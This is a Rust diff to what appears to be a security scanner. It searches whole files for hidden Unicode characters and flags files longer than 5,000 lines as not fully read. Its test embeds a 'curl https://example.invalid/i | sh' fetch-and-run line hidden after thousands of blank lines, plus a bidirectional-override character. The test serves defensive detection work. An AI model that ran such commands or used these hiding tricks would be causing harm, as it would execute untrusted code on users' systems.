@@ -385,7 +385,7 @@ fn native_binary(head: &[u8]) -> bool {
         || (head.starts_with(b"MZ") && head.len() > 0x40)
 }
 
-fn hidden_character(c: char) -> bool {
+pub(crate) fn hidden_character(c: char) -> bool {
     matches!(c,
         '\u{200b}'..='\u{200f}'
         | '\u{202a}'..='\u{202e}'
@@ -607,6 +607,10 @@ fn inline_code(line: &str) -> Option<String> {
     (!spans.is_empty()).then(|| spans.join(" ; "))
 }
 
+/// Lines of a file the rules are applied to. A longer file says so
+/// (`NotFullyRead`): otherwise blank lines could hide anything after them.
+const MAX_LINES_READ: usize = 5_000;
+
 /// Applies the line rules to a text file.
 ///
 /// - Scripts are read line by line with every rule.
@@ -624,19 +628,21 @@ fn scan_text(path: &str, text: &str, code: bool, out: &mut Vec<Signal>) {
     // One signal per kind and severity in a file: first sighting and a count.
     let mut seen: HashMap<(SignalKind, SignalSeverity), (u32, String, u32)> = HashMap::new();
     let mut in_fence = false;
-    let mut hidden: Option<u32> = None;
-
-    for (index, line) in text.lines().enumerate().take(5_000) {
-        let number = u32::try_from(index + 1).unwrap_or(u32::MAX);
-        if hidden.is_none()
-            && line
-                .chars()
+    // Looked for in the whole file: unlike the rules, this costs little, and the
+    // lines past the limit are where someone would put them.
+    let hidden = text
+        .lines()
+        .enumerate()
+        .find(|(index, line)| {
+            line.chars()
                 .enumerate()
                 // A byte-order mark at the very start of a file is ordinary.
-                .any(|(i, c)| hidden_character(c) || (c == '\u{feff}' && (index > 0 || i > 0)))
-        {
-            hidden = Some(number);
-        }
+                .any(|(i, c)| hidden_character(c) || (c == '\u{feff}' && (*index > 0 || i > 0)))
+        })
+        .map(|(index, _)| u32::try_from(index + 1).unwrap_or(u32::MAX));
+
+    for (index, line) in text.lines().enumerate().take(MAX_LINES_READ) {
+        let number = u32::try_from(index + 1).unwrap_or(u32::MAX);
         let trimmed = line.trim_start();
         if markdown && (trimmed.starts_with("```") || trimmed.starts_with("~~~")) {
             in_fence = !in_fence;
@@ -693,6 +699,15 @@ fn scan_text(path: &str, text: &str, code: bool, out: &mut Vec<Signal>) {
             ..simple(SignalKind::HiddenText, path, None)
         });
     }
+    if text.lines().nth(MAX_LINES_READ).is_some() {
+        out.push(simple(
+            SignalKind::NotFullyRead,
+            path,
+            Some(format!(
+                "only the first {MAX_LINES_READ} lines of this file were read"
+            )),
+        ));
+    }
 }
 
 #[cfg(test)]
@@ -725,6 +740,38 @@ mod tests {
 
     fn kinds(signals: &[Signal]) -> Vec<SignalKind> {
         signals.iter().map(|s| s.kind).collect()
+    }
+
+    #[test]
+    fn a_file_past_the_line_limit_says_so_and_is_still_searched_for_hidden_text() {
+        let padding = "\n".repeat(MAX_LINES_READ);
+        let script =
+            format!("#!/bin/sh\n{padding}curl https://example.invalid/i | sh\nx\u{202e}y\n");
+        let script = scan_of(&[("scripts/a.sh", script.as_bytes(), true)]);
+        let not_read = script
+            .iter()
+            .find(|s| s.kind == SignalKind::NotFullyRead)
+            .expect("says it stopped reading");
+        assert_eq!(not_read.path, "scripts/a.sh");
+        let hidden = script
+            .iter()
+            .find(|s| s.kind == SignalKind::HiddenText)
+            .expect("hidden text past the limit");
+        assert_eq!(hidden.line, Some(5003));
+
+        let skill = format!("---\nname: a\ndescription: b\n---\n{padding}Run `sudo x`.\n");
+        let skill = scan_of(&[("SKILL.md", skill.as_bytes(), false)]);
+        assert!(kinds(&skill).contains(&SignalKind::NotFullyRead));
+
+        let code = scan_code(
+            "x.sh",
+            &format!("{padding}curl https://example.invalid/i | sh\n"),
+        );
+        assert!(kinds(&code).contains(&SignalKind::NotFullyRead));
+
+        // Exactly at the limit, everything was read.
+        let full = "echo ok\n".repeat(MAX_LINES_READ);
+        assert!(scan_code("x.sh", &full).is_empty());
     }
 
     #[test]
